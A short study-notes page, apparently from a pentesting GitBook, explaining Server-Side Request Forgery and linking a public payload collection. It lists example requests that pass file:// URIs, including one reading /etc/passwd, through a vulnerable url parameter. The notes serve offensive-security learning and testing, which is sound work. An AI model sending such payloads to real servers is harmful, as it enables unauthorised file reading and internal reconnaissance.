# Server-Side Request Forgery (SSRF)

## Introduction

* <mark style="color:yellow;">An attacker can expose internal network configurations and have the ability to reveal secrets and other information from internal network enumeration stemming from a vulnerable web app</mark>
* In some cases, you may be able to <mark style="color:yellow;">access other internal systems</mark>

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Fundamentals

* Basically, a <mark style="color:yellow;">SSRF</mark> is when an attacker will forge a <mark style="color:yellow;">request that will act as a proxy</mark>
* This proxy will point to EITHER a <mark style="color:yellow;">local or remote source</mark>
* The RESPONSE will contain the data resulting from the request

## Attack Vectors

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#tools" %}

### File Schema:&#x20;

<mark style="color:yellow;">`GET /?url=file:///etc/passwd HTTP/1.1`</mark>

* Notice the 3 /'s&#x20;

<mark style="color:yellow;">`GET /?url=file:/PathToFile`</mark>

<mark style="color:yellow;">`GET /?url=file://hostname/PathToFile`</mark>
